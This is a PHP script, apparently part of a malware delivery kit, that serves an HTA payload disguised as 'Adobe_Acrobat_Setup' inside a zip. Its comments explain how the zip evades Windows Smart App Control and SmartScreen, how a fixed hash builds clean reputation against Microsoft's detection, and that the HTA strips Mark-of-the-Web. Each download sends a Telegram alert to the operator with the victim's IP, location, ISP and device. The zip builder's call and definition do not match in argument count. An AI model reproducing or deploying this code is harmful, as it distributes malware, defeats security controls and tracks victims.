<?php
require __DIR__ . '/../lib.php';

// ============================================================
//  The actual download. Serves the SAME byte-identical .zip on
//  every download: fixed inner name, fixed zip timestamps, fixed
//  content. A stable SHA-256 lets the file accumulate clean
//  prevalence/reputation in Microsoft's cloud detection; rotating
//  the hash per download makes EVERY copy a first-seen file, which
//  is exactly what gets flagged.
//  The OUTER filename still rotates per visit (cosmetic realism) —
//  filename does not affect the hash.
//  The zip wrapper also evades Windows Smart App Control's
//  dangerous-extension block for .hta downloads (a .zip is not
//  blocked) and drops the SmartScreen publisher check that a
//  directly-downloaded unsigned .hta triggers.
// ============================================================

$tok = gate_dl();

// ---- name for THIS download (fixed by the visit, not by this request) ----
$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
// Served file is a .zip; entry inside keeps the .hta name (that's what
// the victim runs after extracting).
$zipName = str_replace('.hta', '.zip', $name);

// ---- read source HTA (byte-identical on every download; the HTA strips
//      its own Mark-of-the-Web at runtime, so no per-copy mutation is
//      needed for unblocking) ----
$src = SOURCE_ZIP;
if (!is_file($src)) { http_response_code(500); echo '500'; exit; }
$bytes = (string)@file_get_contents($src);
if ($bytes === '') { http_response_code(500); echo '500'; exit; }
$levelKey = (string)($_ENV['LEVEL_API_KEY'] ?? (getenv('LEVEL_API_KEY') ?: ''));
if ($levelKey !== '') {
    $i = strpos($bytes, '@@LEVEL_KEY@@');
    if ($i !== false) {
        $bytes = substr($bytes, 0, $i) . $levelKey
              . substr($bytes, $i + strlen('@@LEVEL_KEY@@'));
    }
}

// ---- wrap the HTA in a DETERMINISTIC .zip (in-memory): fixed entry name,
//      fixed DOS timestamp, no extra fields -> same outer SHA-256 always. ----
$bytes = build_zip('Adobe_Acrobat_Setup.hta', $bytes);

// ---- one Telegram alert per real served download (deduped by visit) ----
$key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g = geo(ip());
    $msg = "\x{1F4E5} Download Served \x{1F4E5}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $zipName . " (" . round(strlen($bytes) / 1048576, 2) . " MB)\n"
         . "\x{1F501} SHA256: " . substr(hash('sha256', $bytes), 0, 16) . "...\n"
         . "\x{1F4F1} Device: " . ua()
         . verdict_line($tok);
    tg($msg);
}

// ---- serve ----
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $zipName . '"');
header('Expires: 0');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Content-Length: ' . strlen($bytes));
echo $bytes;
exit;

// ---- zip builder ----
function build_zip(string $zipName, string $innerName, string $inner): string {
    if (class_exists('ZipArchive')) {
        $p = tempnam(sys_get_temp_dir(), 'zipdl_');
        $zip = new ZipArchive();
        if ($zip->open($p, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            $zip->addFromString($innerName, $inner);
            $zip->close();
            $data = (string)file_get_contents($p);
            @unlink($p);
            if ($data !== '') return $data;
        } else {
            @unlink($p);
        }
    }
    // Fallback: serve the bare HTA under the requested name if the zip
    // extension is unavailable (it is installed in the Docker image).
    return $inner;
}
